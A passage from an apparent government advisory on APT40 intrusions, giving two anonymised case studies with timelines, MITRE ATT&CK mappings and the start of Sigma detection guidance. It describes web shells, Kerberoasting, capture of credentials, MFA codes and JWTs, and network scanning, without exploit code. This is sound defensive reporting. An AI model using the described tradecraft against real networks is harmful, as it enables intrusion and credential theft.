<p>Beginning in July, actors were able to test and exploit a custom web application [<a href=\"https://attack.mitre.org/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] running on <code>&lt;webapp&gt;2-ext</code>, which enables the group to establish a foothold in the network demilitarized zone (DMZ). This was leveraged to enumerate both the network as well as all visible domains. Compromised credentials [<a href=\"https://attack.mitre.org/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a>] were used to query the Active Directory [<a href=\"https://attack.mitre.org/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>] and exfiltrate data by mounting file shares [<a href=\"https://attack.mitre.org/techniques/T1039/\" title=\"Data from Network Shared Drive\">T1039</a>] from multiple machines within the DMZ. The actor carried out a Kerberoasting attack in order to obtain valid network credentials from a server [<a href=\"https://attack.mitre.org/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a>]. The group were not observed gaining any additional points of presence in either the DMZ or the internal network.</p>
<h3>Visual Timeline</h3>
<p>The below timeline provides a broad overview of the key phases of malicious actor activity observed on the organization’s network.</p>
  
  
  
  
<figure class=\"c-figure c-figure--large c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">  <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-07/AA24-190A-apt40-advisory-visual-timeline-figure2.png?itok=lfBPL26D\" width=\"1024\" height=\"550\" alt=\"Figure 2: APT40 Advisory Visual Timeline\">


</div>
  </figure>
<h3>Detailed Timeline</h3>
<p><strong>July:</strong> The actors established an initial connection to the front page of a custom web application [<a href=\"https://attack.mitre.org/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>] built for the organization (hereafter referred to as the “web application” or “<code><em>webapp</em></code>”) via a transport layer security (TLS) connection [<a href=\"https://attack.mitre.org/techniques/T1102/\" title=\"Web Service\">T1102</a>]. No other noteworthy activity was observed.</p>
<p><strong>July:</strong> The actors begin enumerating the web application’s website looking for endpoints[2] to further investigate.</p>
<p><strong>July:</strong> The actors concentrate on attempts to exploit a specific endpoint.</p>
<p><strong>July:</strong> The actors are able to successfully&nbsp;POST&nbsp;to the web server, probably via a web shell placed on another page. A second IP, likely employed by the same actors, also begins posting to the same URL. The actors created and tested a number of likely web shells.&nbsp;</p>
<p>The exact method of exploitation is unknown, but it is clear that the specific endpoint was targeted to create files on&nbsp;<code><em>&lt;webapp&gt;2</em>-ext</code>.</p>
<p>ASD's ACSC believes that the two IP address connections were part of the same intrusion due to their shared interest and initial connections occurring minutes apart.</p>
<p><strong>July:</strong> The group continue to conduct host enumeration, looking for privilege escalation opportunities, and deploying a different web shell. The actors log into the web application using compromised credentials for&nbsp;<code><em>&lt;firstname.surname&gt;</em>@<em>&lt;organisation domain&gt;</em></code>.</p>
<p>The actors’ activity does not appear to have successfully achieved privilege escalation on&nbsp;<code><em>&lt;webapp&gt;2</em>-ext</code>. Instead, the actors pivoted to network-based activity.</p>
<p><strong>July:</strong>&nbsp;The actor tests the compromised credentials for a service account[3] which it likely found hardcoded in internally accessible binaries.</p>
<p><strong>July:</strong> The actors deploy the open-source tool Secure Socket Funnelling, which was used to connect out to the malicious infrastructure. This connection is employed to tunnel traffic from the actor's attack machines into the organization’s internal networks, whose machine names are exposed in event logs as they attempt to use the credentials for the service account.</p>
<p><strong>August:</strong> The actors are seen conducting a limited amount of activity, including failing to establish connections involving the service account.</p>
<p><strong>August:</strong> The actors perform significant network and Active Directory enumeration. A different compromised account is subsequently employed to mount shares[4] on Windows machines within the DMZ, enabling successful data exfiltration.</p>
<p>This seems to be opportunistic usage of a stolen credential on mountable machines in the DMZ. Firewalls blocked the actor from targeting the internal network with similar activity.</p>
<p><strong>August – September:</strong> The SSF tool re-established a connection to a malicious IP. The group are not observed performing any additional activities until their access is blocked.</p>
<p><strong>September:</strong> The organization blocks the malicious IP by denylisting it on their firewalls.</p>
<h2><strong>Actor Tactics and Techniques</strong></h2>
<p>The MITRE ATT&amp;CK framework is a documented collection of tactics and techniques employed by threat actors in cyberspace. The framework was created by U.S. not-for-profit The MITRE Corporation and functions as a common global language around threat actor behavior.</p>
<p>The ASD’s ACSC assesses the following techniques and tactics to be relevant to the actor’s malicious activity:</p>
<h3>Reconnaissance</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1594/\" title=\"Search Victim-Owned Websites\">T1594</a> – Search Victim-Owned Websites</p>
<p>The actor enumerated the custom web application’s website to identify opportunities for accessing the network.</p>
<h3>Initial Access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a> – Exploit Public-Facing Application (regarding exploiting the custom web application)</p>
<p><a href=\"https://attack.mitre.org/techniques/T1078/002/\" title=\"Valid Accounts: Domain Accounts\">T1078.002</a> – Valid Accounts: Domain Accounts (regarding logging on with comprised credentials)</p>
<p>Exploiting internet-exposed custom web applications provided an initial point of access for the actor. The actor was later able to use credentials they had compromised to further their access to the network.</p>
<h3>Execution</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1059\" title=\"Command and Scripting Interpreter\">T1059</a> – Command and Scripting Interpreter (regarding command execution through the web shell)</p>
<p><a href=\"https://attack.mitre.org/techniques/T1072/\" title=\"Software Deployment Tools\">T1072</a> – Software Deployment Tools (regarding the actor using open-source tool Secure Socket Funnelling (SSF) to connect to an IP)</p>
<h3>Persistence</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a> – Server Software Component: Web Shell (regarding use of a web shell and SSF to establish access)</p>
<h3>Credential Access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1552/001/\" title=\"Credentials from Password Stores\">T1552.001</a> – Credentials from Password Stores (regarding password files relating to building management system [BMS])</p>
<p><a href=\"https://attack.mitre.org/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a> – Steal or Forge Kerberos Tickets: Kerberoasting (regarding attack to gain network credentials)</p>
<h3>Lateral movement</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1021/002/\" title=\"Remote Services: SMB Shares\">T1021.002</a> – Remote Services: SMB Shares (regarding the actor mounting SMB shares from multiple devices)</p>
<h3>Collection</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1213/\" title=\"Data from Information Repositories\">T1213</a> – Data from Information Repositories (regarding manuals/documentation found on the BMS server)</p>
<h3>Exfiltration</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1041/\" title=\"Exfiltration Over C2 Channel\">T1041</a> – Exfiltration Over C2 Channel (regarding the actor’s data exfiltration from Active Directory and mounting shares)</p>
<h2><strong>Case Study 2</strong></h2>
<h5>This report has been anonymized to enable wider dissemination. The impacted organization is hereafter referred to as “the organization.” Some specific details have been removed to protect the identity of the victim and incident response methods of ASD’s ACSC.</h5>
<h3>Executive Summary</h3>
<p>This report details the findings of ASD’s ACSC investigation into the successful compromise of the organization’s network in April 2022. This investigation report was provided to the organization to summarize observed malicious activity and frame remediation recommendations. The findings indicate the compromise was undertaken by APT40.</p>
<p>In May 2022, ASD’s ACSC notified an organization of suspected malicious activity impacting the organization’s network since April 2022. Subsequently, the organization informed ASD's ACSC that they had discovered malicious software on an internet‑facing server which provided the login portal for the organization’s corporate remote access solution. This server used a remote access login and identity management product and will be referred to in this report as 'the compromised appliance'. This report details the investigation findings and remediation advice developed for the organization in response to the investigation conducted by the ASD’s ACSC.</p>
<p>Evidence indicated that part of the organization’s network had been compromised by malicious cyber actor(s) via the organization’s remote access login portal since at least April 2022. This server may have been compromised by multiple actors, and was likely affected by a remote code execution (RCE) vulnerability that was widely publicized around the time of the compromise.</p>
<p>Key actor activity observed by the ASD’s ACSC included:</p>
<ul>
<li>Host enumeration, which enables an actor to build their own map of the network;</li>
<li>Exploitation of internet-facing applications and web shell use, giving the actor an initial foothold on the network and a capability to execute commands;</li>
<li>Exploitation of software vulnerabilities to escalate privileges; and</li>
<li>Credential collection to enable lateral movement.</li>
</ul>
<p>The ASD’s ACSC discovered that a malicious actor had exfiltrated several hundred unique username and password pairs on the compromised appliance in April 2022, as well as a number of multi-factor authentication codes and technical artefacts related to remote access sessions. Upon a review by the organization, the passwords were found to be legitimate. The ASD’s ACSC assesses that the actor may have collected these technical artefacts to hijack or create a remote login session as a legitimate user, and access the organization’s internal corporate network using a legitimate user account.</p>
<h3>Investigation Summary</h3>
<p>The ASD’s ACSC determined that the actor compromised appliance(s) which provide remote login sessions for organization staff and used this compromise to attempt to conduct further activity. These appliances consist of three load-balanced hosts where the earliest evidence of compromise was detected. The organization shut down two of the three load-balanced hosts shortly after the initial compromise. As a result, all subsequent activity occurred on a single host. The other servers associated with the compromised appliance were also load-balanced in a similar manner. For legibility, all compromised appliances are referred to in most of this report as a “single appliance.”</p>
<p>The actor is believed to have used publicly known vulnerabilities to deploy web shells to the compromised appliance from April 2022 onwards. Threat actors from the group are assessed to have attained escalated privileges on the appliance. The ASD’s ACSC could not determine the full extent of the activity due to lack of logging availability. However, evidence on the device indicates that an actor achieved the following:</p>
<ul>
<li>The collection of several hundred genuine username and password pairs; and</li>
<li>The collection of technical artefacts which may have allowed a malicious actor to access a virtual desktop infrastructure (VDI) session as a legitimate user.</li>
</ul>
<p>The ASD’s ACSC assesses that the actor would have sought to further the compromise of the organisation network. The artefacts exfiltrated by the actor may have allowed them to hijack or initiate virtual desktop sessions as a legitimate user, possibly as a user of their choice, including administrators. The actor may have used this access vector to further compromise organization services to achieve persistence and other goals.</p>
<p>Other organization appliances within the hosting provider managed environment did not show evidence of compromise.</p>
<h3>Access</h3>
<p>The host with the compromised appliance provided authentication via Active Directory and a webserver, for users connecting to VDI sessions [<a href=\"https://attack.mitre.org/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>].</p>
<table>
<tbody>
<tr>
<td><strong>Location</strong></td>
<td>Compromised appliance hostnames (load-balanced)</td>
</tr>
<tr>
<td><strong>Datacentre 1</strong></td>
<td>HOST1, HOST2, HOST3</td>
</tr>
</tbody>
</table>
<p>The appliance infrastructure also included access gateway hosts that provide a tunnel to the VDI for the user, once they possess an authentication token generated and downloaded from the appliance.</p>
<p>There was no evidence of compromise of any of these hosts. However, the access gateway hosts logs showed evidence of significant interactions with known malicious IP addresses. It is likely that this reflected activity that occurred on this host, or network connections with threat actor infrastructure that reached this host. The nature of this activity could not be determined using available evidence but indicates that the group sought to move laterally in the organization’s network [<a href=\"https://attack.mitre.org/tactics/TA0008/\" title=\"Lateral Movement\">TA0008</a>].</p>
<p>Internal Hosts</p>
<p>The ASD’s ACSC investigated limited data from the internal organization’s network segment. Attempted or successful malicious activity known to have impacted the internal organization’s network segment includes actor access to VDI-related artefacts, the scraping of an internal SQL server [<a href=\"https://attack.mitre.org/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a>], and unexplained traffic observed going from known malicious IP addresses through the access gateway appliances [<a href=\"https://attack.mitre.org/tactics/TA0011/\" title=\"Command and Control\">TA0011</a>].</p>
<p>Using their access to the compromised appliance, the group collected genuine usernames, passwords [<a href=\"https://attack.mitre.org/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>], and MFA token values [<a href=\"https://attack.mitre.org/techniques/T1111/\" title=\"Multi-Factor Authentication Interception\">T1111</a>]. The group also collected JSON Web Tokens (JWTs) [<a href=\"https://attack.mitre.org/techniques/T1528/\" title=\"Steal Application Access Token\">T1528</a>], which is an authentication artefact used to create virtual desktop login sessions. The actor may have been able to use these to create or hijack virtual desktop sessions [<a href=\"https://attack.mitre.org/techniques/T1563/002/\" title=\"Remote Service Session Hijacking: RDP Hijacking\">T1563.002</a>] and access the internal organization network segment as a legitimate user [<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].</p>
<p>The actor also used access to the compromised appliance to scrape an SQL server [<a href=\"https://attack.mitre.org/techniques/T1505/001/\" title=\"Server Software Component: SQL Stored Procedures\">T1505.001</a>], which resided in the organization’s internal network. It is likely that the actor had access to this data.</p>
<p>Evidence available from the access gateway appliance revealed that network traffic occurred through or to this device from known malicious IP addresses. As described above, this may indicate that malicious cyber actors impacted or utilized this device, potentially to pivot into the internal network.</p>
<h3>Investigation Timeline</h3>
<p>The below list provides a timeline of key activities discovered during the investigation.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Time</strong></th>
<th role=\"columnheader\"><strong>Event</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>Known&nbsp;malicious&nbsp;IP&nbsp;addresses&nbsp;interact&nbsp;with&nbsp;access&nbsp;gateway host&nbsp;HOST7.&nbsp;The&nbsp;nature&nbsp;of&nbsp;the interactions&nbsp;could&nbsp;not&nbsp;be&nbsp;determined.</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>All&nbsp;hosts,&nbsp;HOST1, HOST2&nbsp;and&nbsp;HOST3, were&nbsp;compromised&nbsp;by&nbsp;a&nbsp;malicious&nbsp;actor&nbsp;or&nbsp;actors, and&nbsp;web&nbsp;shells&nbsp;were&nbsp;placed&nbsp;on&nbsp;the&nbsp;hosts.</p>
<p>A&nbsp;log&nbsp;file&nbsp;was created&nbsp;or&nbsp;modified&nbsp;on HOST2.&nbsp;This&nbsp;file contains&nbsp;credential&nbsp;material&nbsp;likely captured&nbsp;by&nbsp;a&nbsp;malicious&nbsp;actor.</p>
<p>The&nbsp;/etc/security/opasswd&nbsp;and&nbsp;/etc/shadow&nbsp;files were&nbsp;modified&nbsp;on&nbsp;HOST1&nbsp;and&nbsp;HOST3, indicating&nbsp;that&nbsp;passwords&nbsp;were&nbsp;changed.&nbsp;Evidence&nbsp;available&nbsp;on&nbsp;HOST1 suggests&nbsp;that&nbsp;the password for user ‘sshuser’ was changed.</p>
</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>HOST2&nbsp;was&nbsp;shut&nbsp;down by&nbsp;the&nbsp;organization.</p>
<p>Additional&nbsp;web&nbsp;shells&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>)&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;and&nbsp;HOST3.&nbsp;HOST1experienced SSH brute force attempts from HOST3.</p>
<p>A&nbsp;log&nbsp;file&nbsp;was&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>)&nbsp;on&nbsp;HOST3.&nbsp;This file&nbsp;contains&nbsp;credential&nbsp;material&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>) likely captured by a malicious actor.</p>
<p>JWTs&nbsp;were&nbsp;captured&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1528/\" title=\"Steal Application Access Token\">T1528</a>)&nbsp;and&nbsp;output&nbsp;to&nbsp;a&nbsp;file&nbsp;on&nbsp;HOST3.</p>
<p>HOST3&nbsp;was&nbsp;shut&nbsp;down&nbsp;by&nbsp;the&nbsp;organization.&nbsp;All&nbsp;activity&nbsp;after&nbsp;this&nbsp;time&nbsp;occurs&nbsp;on&nbsp;HOST1.</p>
</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>Additional&nbsp;web&nbsp;shells&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).&nbsp;JWTs&nbsp;were&nbsp;captured&nbsp;and&nbsp;output to&nbsp;a&nbsp;file&nbsp;on&nbsp;HOST1.</td>
</tr>
<tr>
<td><strong>April&nbsp;2022</strong></td>
<td>
<p>Additional&nbsp;web&nbsp;shells are&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>),&nbsp;and a&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address interacts&nbsp;with&nbsp;the&nbsp;host&nbsp;(<a href=\"https://attack.mitre.org/tactics/TA0011/\" title=\"Command and Control\">TA0011</a>).</p>
<p>A&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;interacts&nbsp;with&nbsp;access&nbsp;gateway&nbsp;host&nbsp;HOST7.</p>
</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>
<p>A known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;interacted&nbsp;with&nbsp;access&nbsp;gateway host&nbsp;HOST7&nbsp;(<a href=\"https://attack.mitre.org/tactics/TA0011/\">TA0011</a>).</p>
<p>An&nbsp;authentication&nbsp;event&nbsp;for&nbsp;a&nbsp;user&nbsp;is&nbsp;linked&nbsp;to&nbsp;a&nbsp;known&nbsp;malicious&nbsp;IP&nbsp;address&nbsp;in&nbsp;logs on HOST1.&nbsp;An&nbsp;additional&nbsp;web&nbsp;shell&nbsp;is&nbsp;created&nbsp;on&nbsp;this&nbsp;host&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).</p>
</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>A&nbsp;script on&nbsp;HOST1&nbsp;was modified&nbsp;by&nbsp;an&nbsp;actor&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1543/\" title=\"Create or Modify System Process\">T1543</a>).&nbsp;This script&nbsp;contains&nbsp;functionality which would have scraped data from an internal SQL server.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>An&nbsp;additional&nbsp;log&nbsp;file&nbsp;on&nbsp;HOST1&nbsp;was&nbsp;last&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>).&nbsp;This&nbsp;file&nbsp;contains&nbsp;username&nbsp;and password&nbsp;pairs&nbsp;for the&nbsp;organization&nbsp;network,&nbsp;which&nbsp;are&nbsp;believed&nbsp;to&nbsp;be&nbsp;legitimate&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>).</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>An&nbsp;additional log&nbsp;file&nbsp;was&nbsp;last&nbsp;modified&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>).&nbsp;This&nbsp;file&nbsp;contains&nbsp;JWTs&nbsp;collected&nbsp;from HOST1.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>Additional&nbsp;web&nbsp;shells&nbsp;were&nbsp;created&nbsp;on&nbsp;HOST1&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>).&nbsp;On&nbsp;this&nbsp;date, the&nbsp;organization reported&nbsp;the&nbsp;discovery&nbsp;of&nbsp;a&nbsp;web&nbsp;shell&nbsp;with&nbsp;creation&nbsp;date&nbsp;in&nbsp;April 2022&nbsp;to&nbsp;ASD’s ACSC</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>A&nbsp;number&nbsp;of&nbsp;scripts were&nbsp;created&nbsp;on HOST1,&nbsp;including&nbsp;one named&nbsp;Log4jHotPatch.jar.</td>
</tr>
<tr>
<td><strong>May&nbsp;2022</strong></td>
<td>The&nbsp;iptables-save&nbsp;command was&nbsp;used&nbsp;to&nbsp;add&nbsp;two&nbsp;open&nbsp;ports to&nbsp;the&nbsp;access gateway&nbsp;host. The&nbsp;ports&nbsp;were&nbsp;9998&nbsp;and&nbsp;9999&nbsp;(<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>).</td>
</tr>
</tbody>
</table>
<h2><strong>Actor Tactics and Techniques</strong></h2>
<p>Highlighted below are several tactics and techniques identified during the investigation.</p>
<h3>Initial&nbsp;access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a>&nbsp;Exploit&nbsp;public&nbsp;facing&nbsp;application</p>
<p>The group likely exploited RCE, privilege escalation, and&nbsp;authentication&nbsp;bypass&nbsp;vulnerabilities&nbsp;in&nbsp;the&nbsp;remote&nbsp;access&nbsp;login&nbsp;and&nbsp;identity&nbsp;management&nbsp;product&nbsp;to&nbsp;gain initial access to the network.</p>
<p>This&nbsp;initial&nbsp;access&nbsp;method&nbsp;is considered&nbsp;the most&nbsp;likely&nbsp;due to the following:</p>
<ul>
<li>The&nbsp;server&nbsp;was&nbsp;vulnerable&nbsp;to&nbsp;these&nbsp;CVEs&nbsp;at&nbsp;the time;</li>
<li>Attempts&nbsp;to&nbsp;exploit&nbsp;these&nbsp;vulnerabilities&nbsp;from&nbsp;known actor infrastructure; and</li>
<li>The first known internal malicious activity occurred&nbsp;shortly&nbsp;after&nbsp;attempted&nbsp;exploitation attempts were made.</li>
</ul>
<h3>Execution</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1059/004\" title=\"Command and Scripting Interpreter: Unix Shell\">T1059.004</a>&nbsp;Command&nbsp;and Scripting&nbsp;Interpreter:&nbsp;Unix Shell</p>
<p>The group successfully exploited the above vulnerabilities&nbsp;may&nbsp;have&nbsp;been&nbsp;able&nbsp;to&nbsp;run&nbsp;commands in a Unix shell available on the affected appliance.</p>
<p>Complete details of the commands run by actors cannot&nbsp;be&nbsp;provided&nbsp;as&nbsp;they&nbsp;were&nbsp;not&nbsp;logged&nbsp;by&nbsp;the appliance.</p>
<h3>Persistence</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1505/003\" title=\"Server Software Component: Web Shell\">T1505.003</a>&nbsp;Server&nbsp;Software&nbsp;Component:&nbsp;Web Shell</p>
<p>Actors deployed several web shells on the affected appliance. It is possible that multiple distinct actors deployed&nbsp;web&nbsp;shells,&nbsp;but&nbsp;that&nbsp;only&nbsp;a&nbsp;smaller&nbsp;number&nbsp;of&nbsp;actors conducted activity using these web shells.</p>
<p>Web&nbsp;shells&nbsp;would&nbsp;have&nbsp;allowed&nbsp;for&nbsp;arbitrary&nbsp;command&nbsp;execution by the actor on the compromised appliances.</p>
<h3>Privilege&nbsp;escalation</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1068\" title=\"Exploitation for Privilege Escalation\">T1068</a>&nbsp;Exploitation&nbsp;for Privilege&nbsp;Escalation</p>
<p>Available evidence does not describe the level of privilege attained by actors. However, using web shells, the actors would have achieved a level of privilege&nbsp;comparable&nbsp;to&nbsp;that&nbsp;of&nbsp;the&nbsp;web&nbsp;server&nbsp;on&nbsp;the&nbsp;compromised appliance. Vulnerabilities believed to have been present on the compromised appliance</p>
<p>would&nbsp;have&nbsp;allowed&nbsp;the&nbsp;actors&nbsp;to&nbsp;attain&nbsp;root&nbsp;privileges.</p>
<h3>Credential&nbsp;access</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1056/003\" title=\"Input Capture: Web Portal Capture\">T1056.003</a>&nbsp;Input&nbsp;Capture:&nbsp;Web&nbsp;Portal&nbsp;Capture</p>
<p>Evidence on the compromised appliance showed that the actor had captured several hundred username-password&nbsp;pairs,&nbsp;in&nbsp;clear&nbsp;text,&nbsp;which&nbsp;are believed&nbsp;to&nbsp;be&nbsp;legitimate.&nbsp;It&nbsp;is&nbsp;likely&nbsp;that&nbsp;these&nbsp;were&nbsp;captured&nbsp;using&nbsp;some&nbsp;modification&nbsp;to&nbsp;the&nbsp;genuine authentication&nbsp;process&nbsp;which&nbsp;output&nbsp;the credentials&nbsp;to a&nbsp;file.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1111\" title=\"Multi-Factor Authentication Interception\">T1111</a>&nbsp;Multi-Factor&nbsp;Authentication&nbsp;Interception The&nbsp;actor&nbsp;also&nbsp;captured&nbsp;the&nbsp;value&nbsp;of&nbsp;MFA&nbsp;tokens</p>
<p>corresponding to legitimate logins. These were likely captured by modifying the genuine authentication process to output these values to a file. There is no evidence of compromise of the “secret server’ which stores&nbsp;the&nbsp;unique&nbsp;values&nbsp;that&nbsp;provide&nbsp;for&nbsp;the&nbsp;security&nbsp;of&nbsp;MFA&nbsp;tokens.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1040\" title=\"Network Sniffing\">T1040</a>&nbsp;Network&nbsp;Sniffing</p>
<p>The actor is believed to have captured JWTs by capturing HTTP traffic on the compromised appliance. There&nbsp;is&nbsp;evidence&nbsp;that&nbsp;the&nbsp;utility&nbsp;tcpdump&nbsp;was&nbsp;executed on the compromised appliance, which may have been how the actor captured these JWTs.</p>
<p><a href=\"https://attack.mitre.org/techniques/T1539\" title=\"Steal Web Session Cookie\">T1539</a>&nbsp;Steal&nbsp;Web Session&nbsp;Cookie</p>
<p>As&nbsp;described&nbsp;above,&nbsp;the&nbsp;actor&nbsp;captured&nbsp;JWTs,&nbsp;which&nbsp;are&nbsp;analogous to web session cookies. These could have been reused by the actor to establish further access.</p>
<h3>Discovery</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1046\" title=\"Network Service Discovery\">T1046</a>&nbsp;Network Service&nbsp;Discovery</p>
<p>There&nbsp;is&nbsp;evidence&nbsp;that&nbsp;network&nbsp;scanning&nbsp;utility nmap was executed on the compromised appliance to&nbsp;scan other appliances in the same network segment. This was likely used by the actor to discover other reachable network services which might present opportunities for lateral movement.</p>
<h3>Collection</h3>
<p>Available evidence does not reveal how actors collected data or exactly what was collected from the&nbsp;compromised&nbsp;appliance&nbsp;or&nbsp;from&nbsp;other&nbsp;systems. However,&nbsp;it&nbsp;is&nbsp;likely&nbsp;that&nbsp;actors&nbsp;had&nbsp;access&nbsp;to&nbsp;all&nbsp;files&nbsp;on the compromised appliance, including the captured&nbsp;credentials&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>],&nbsp;MFA&nbsp;token&nbsp;values&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1111/\" title=\"Multi-Factor Authentication Interception\">T1111</a>],&nbsp;and&nbsp;JWTs described above.</p>
<h3>Command&nbsp;and&nbsp;Control</h3>
<p><a href=\"https://attack.mitre.org/techniques/T1071/001\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>&nbsp;Application&nbsp;Layer&nbsp;Protocol:&nbsp;Web&nbsp;Protocols</p>
<p>Actors&nbsp;used&nbsp;web&nbsp;shells&nbsp;for&nbsp;command&nbsp;and&nbsp;control.&nbsp;Web&nbsp;shell commands would have been passed over HTTPS&nbsp;using&nbsp;the&nbsp;existing&nbsp;web&nbsp;server&nbsp;on&nbsp;the appliance&nbsp;[<a href=\"https://attack.mitre.org/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>].</p>
<p><a href=\"https://attack.mitre.org/versions/v15/techniques/T1001/003/\" title=\"Data Obfuscation: Protocol Impersonation\">T1001.003</a>&nbsp;Data&nbsp;Obfuscation:&nbsp;Protocol&nbsp;Impersonation</p>
<p>Actors&nbsp;used&nbsp;compromised&nbsp;devices&nbsp;as&nbsp;a&nbsp;launching&nbsp;point for&nbsp;attacks&nbsp;that&nbsp;are&nbsp;designed&nbsp;to&nbsp;blend&nbsp;in&nbsp;with&nbsp;legitimate&nbsp;traffic.</p>
<h2><strong>Detection&nbsp;and&nbsp;mitigation recommendations</strong></h2>
<p>The&nbsp;ASD’s&nbsp;ACSC&nbsp;strongly&nbsp;recommends&nbsp;implementing&nbsp;the&nbsp;ASD&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/essential-eight\" title=\"Essential Eight\">Essential&nbsp;Eight</a>&nbsp;Controls&nbsp;and&nbsp;associated&nbsp;<a href=\"https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/strategies-mitigate-cyber-security-incidents/strategies-mitigate-cyber-security-incidents-mitigation-details\" title=\"Strategies&nbsp;to&nbsp;Mitigate&nbsp;Cyber&nbsp;Security&nbsp;Incidents\">Strategies&nbsp;to&nbsp;Mitigate&nbsp;Cyber&nbsp;Security&nbsp;Incidents</a>.&nbsp;Below are recommendations for network security actions that&nbsp;should&nbsp;be&nbsp;taken&nbsp;to&nbsp;detect&nbsp;and&nbsp;prevent&nbsp;intrusions by&nbsp;APT40,&nbsp;followed&nbsp;by&nbsp;specific&nbsp;mitigations&nbsp;for&nbsp;four&nbsp;key&nbsp;TTPs&nbsp;summarized&nbsp;in&nbsp;Table&nbsp;1.</p>
<h3>Detection</h3>
<p>Some of the files identified above were dropped in locations such as C:\\Users\\Public\\* and C:\\Windows\\ Temp\\*.&nbsp;These locations can be convenient spots for writing data as they are usually world writable, that is, all user accounts registered in Windows have access to these directories and their subdirectories. Often, any&nbsp;user&nbsp;can&nbsp;subsequently&nbsp;access&nbsp;these&nbsp;files,&nbsp;allowing opportunities for lateral movement, defense evasion, low-privilege execution and staging for exfiltration.</p>
<p>The&nbsp;following&nbsp;Sigma&nbsp;rules&nbsp;look&nbsp;for&nbsp;execution&nbsp;from suspicious locations as an indicator of anomalous activity.&nbsp;In&nbsp;all&nbsp;instances,&nbsp;subsequent&nbsp;investigation&nbsp;is required&nbsp;to&nbsp;confirm&nbsp;malicious&nbsp;activity&nbsp;and&nbsp;attribution.</p>
<table>
<tbody>
<tr>
<td>
<h5>Title:&nbsp;World&nbsp;Writable&nbsp;Execution&nbsp;-&nbsp;Temp</h5>
<p><strong>ID:&nbsp;</strong>d2fa2d71-fbd0-4778-9449-e13ca7d7505c</p>
